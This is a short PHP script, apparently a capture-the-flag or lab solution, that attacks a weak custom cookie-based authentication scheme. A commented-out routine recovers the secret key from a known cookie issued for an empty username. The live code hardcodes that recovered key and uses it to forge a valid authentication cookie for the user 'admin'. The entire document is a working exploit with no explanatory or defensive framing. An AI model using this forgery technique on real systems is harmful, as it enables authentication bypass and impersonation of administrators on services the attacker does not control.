<?php

function get_auth_key()
{
	/**
	
	$user = '';
	$auth = '0c82c312c766e23720b76cd1255aa5ae';
	
	$userMd5 = md5($user, true);
	
	$authKey = '';
	for ($i = 0; $i < strlen($auth); $i += 2) {
		$resultBin = ord(hex2bin($auth[$i] . $auth[$i + 1]));
		
		for ($j = 0; $j < 256; $j++) {
			if ((($j + ord($userMd5[$i / 2])) % 256) == $resultBin) {
				$authKey .= chr($j);
				break;
			}
		}
		
		
	}
	
	return $authKey;
	
	**/
	return "8e798f0377c99bc07cf1be129e35f8d5";
}

function create_auth_cookie($user)
{
    $authKey = get_auth_key();
    if (!$authKey) {
        return false;
    }
	
    $userMd5 = md5($user, true);

    $result = '';
    for ($i = 0; $i < strlen($userMd5); $i++) {
        $result .= bin2hex(chr((ord($authKey[$i]) + ord($userMd5[$i])) % 256));
    }
    return $result;
}

$user = 'admin';
var_dump(create_auth_cookie($user));